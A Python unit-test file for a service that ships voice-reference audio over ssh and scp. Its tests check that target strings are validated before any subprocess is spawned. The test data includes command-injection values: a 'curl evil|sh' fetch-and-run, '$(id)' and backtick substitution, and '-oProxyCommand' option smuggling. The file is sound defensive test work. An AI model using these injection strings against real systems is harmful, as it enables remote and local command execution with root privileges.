"""Voice-reference ship targets — the one setting that reaches a command line.

Why this fails SILENTLY: `voice_ref_hosts` ('user@host:/abs/dir', comma-separated) is
split into a host and a directory that go straight into `ssh <host> "mkdir -p <dir>"`
and `scp … <host>:<dir>/…`, run as the service user (root on prod). The only check was
"the dir starts with /", so `root@box:/x;curl evil|sh` ran a remote shell command and a
host like `-oProxyCommand=…` a LOCAL one (review 2026-09-23). A successful injection
looks exactly like a normal ship — the upload even reports ok. So the target syntax is
pinned to plain host and path characters, refused before any process is spawned, and
the argv separates options from the host with `--`.
"""
import asyncio
import os
import sys
import tempfile
import unittest
from unittest import mock

_here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_prev = os.getcwd()
_tmp = tempfile.TemporaryDirectory()
with open(os.path.join(_tmp.name, "config.yaml"), "w") as _f:
    _f.write('api_key: ""\nbackends: []\n')
os.chdir(_tmp.name)
sys.path.insert(0, _here)
try:
    import main
finally:
    os.chdir(_prev)
    _tmp.cleanup()
    del _tmp


class TargetSyntax(unittest.TestCase):
    def test_valid_targets(self):
        for t, want in (("root@192.168.8.38:/root/localai/models/voices",
                         ("root@192.168.8.38", "/root/localai/models/voices")),
                        ("tts-box:/srv/voices/", ("tts-box", "/srv/voices")),
                        ("kai@k12.lan:/data/voice_refs", ("kai@k12.lan", "/data/voice_refs"))):
            self.assertEqual(main.parse_voice_target(t), want, t)

    def test_injection_attempts_are_refused(self):
        for t in ("root@box:/x;curl evil|sh", "root@box:/x $(id)", "root@box:/x`id`",
                  "root@box:/x&&id", "root@box:/x\nid", "root@box:/a b",
                  "-oProxyCommand=sh -c id:/x", "-oProxyCommand=id:/x",
                  "root@-oProxyCommand=id:/x", "root@box:relative/dir", "root@box",
                  "root@box:/x/../../etc", "user@host@x:/d", "@host:/d", "user@:/d", ""):
            self.assertIsNone(main.parse_voice_target(t), repr(t))


class ShipRefusesBeforeSpawning(unittest.TestCase):
    def _ship(self, hosts, vdir="/models/voices"):
        blob = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        blob.write(b"RIFF"); blob.close()
        self.addCleanup(os.unlink, blob.name)
        lib = {"v": {"file": blob.name}}
        calls = []

        async def fake_exec(*argv, **kw):
            calls.append(list(argv))
            proc = mock.MagicMock()
            proc.returncode = 0

            async def communicate():
                return (b"", b"")
            proc.communicate = communicate
            return proc
        with mock.patch.object(main.store, "is_active", return_value=True), \
             mock.patch.object(main.store, "get_voice_library", return_value=lib), \
             mock.patch.object(main.store, "set_voice_entry"), \
             mock.patch.object(main, "voice_ship_config", return_value=(hosts, vdir)), \
             mock.patch.object(main.asyncio, "create_subprocess_exec", fake_exec):
            ok, msg = asyncio.run(main.ship_voice_ref("v"))
        return ok, msg, calls

    def test_bad_target_spawns_nothing(self):
        ok, msg, calls = self._ship(["root@box:/ok", "root@box:/x;curl evil|sh"])
        self.assertFalse(ok)
        self.assertEqual(calls, [])

    def test_bad_voice_dir_spawns_nothing(self):
        ok, msg, calls = self._ship(["root@box:/ok"], vdir="/models/v;id")
        self.assertFalse(ok)
        self.assertEqual(calls, [])

    def test_argv_separates_options_from_host(self):
        _ok, _msg, calls = self._ship(["root@box:/srv/voices"])
        ssh = next(c for c in calls if c[0] == "ssh")
        scp = next(c for c in calls if c[0] == "scp")
        self.assertEqual(ssh[ssh.index("--") + 1], "root@box")
        self.assertEqual(ssh[-1], "mkdir -p -- /srv/voices")
        self.assertIn("--", scp)
        self.assertTrue(scp[-1].startswith("root@box:/srv/voices/"))


if __name__ == "__main__":
    unittest.main()
